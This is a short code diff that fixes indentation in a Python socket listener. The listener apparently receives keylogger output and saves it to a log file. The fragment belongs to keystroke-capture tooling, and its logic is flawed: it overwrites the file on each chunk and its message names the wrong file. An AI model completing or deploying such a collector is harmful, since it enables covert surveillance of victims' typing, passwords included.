@@ -14,9 +14,10 @@ print('Connected to {}'.format(addr))
 
 while True:
 	data = conn.recv(1024)
-	if not data: break
+	if not data: 
+		break
 	
 	with open("keylog_formatted.txt", "w") as log_raw:
-	log_raw.write(data)
-	log_raw.close()
+		log_raw.write(data)
+		log_raw.close()
 	print('[*] Formatted output saved in keylog_raw.txt' + '\n')
